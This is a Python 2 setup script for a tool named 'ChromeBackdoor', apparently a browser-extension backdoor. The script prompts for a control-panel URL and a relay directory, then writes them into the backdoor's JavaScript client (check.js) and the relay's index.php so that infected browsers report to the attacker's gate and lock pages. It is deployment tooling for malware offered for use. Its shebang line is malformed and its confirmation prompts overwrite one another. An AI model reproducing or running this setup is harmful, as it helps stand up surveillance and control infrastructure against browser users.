#!usr/bin/env python3

import os,sys

def install_relais():
    install_status = 0
    try:
        while install_status != 1:
            domain = raw_input('[*] domain url without web (ex: http://site.com/chromebackdoor/) > ')
            if domain.endswith('/'):
                file_read = open('../relais/index.php').read()
                if "//domain" in file_read:
                    code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
                    file_write = open('../relais/index.php', 'w')
                    file_write.write(code)
                    print "Install relais [OK]"
                    install_status = 1
            else:
                print "Please use correct url ex: http://site.com/chromebackdoor/"
    except:
        print "\n Bye ^^"

def install_server():
    try:
        get_url = 1
        while(get_url != 2):
            panel = raw_input('[*] ChromeBackdoor > Panel url without web/? ')
            relais = raw_input('[*] ChromeBackdoor > Relais dir? ')
            relais_end = panel + relais
            relais_lock = relais_end +  "/lock.php"
            relais_gate = relais_end + "/index.php"
            print "------------\n"
            check = raw_input(relais_end + " correct url for relais? [y/n]")
            check = raw_input(relais_lock + " correct url for relais lock.php? [y/n]")
            check = raw_input(relais_gate + " correct url for relais index.php? [y/n]")
            if check == 'y' or check == 'Y':
                get_url = 2
        if(os.path.isfile('../server/js/check.js')):
            file_read = open('../server/js/check.js').read()
            if "//settings" in file_read:
                code = file_read.replace("//settings", "\n\n    var server_web = '"+panel+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
                file_write = open('../server/js/check.js', 'w')
                file_write.write(code)
                file_write.close()
                print "Server config [OK]"
                install_relais()
            else:
                print "not here"
        
    except:
        print "bye ^^"

def main():
    if(len(sys.argv) > 1):
        if(sys.argv[1] == "install"):
            install_server()
    else:
        print sys.argv[0] + " install"

main()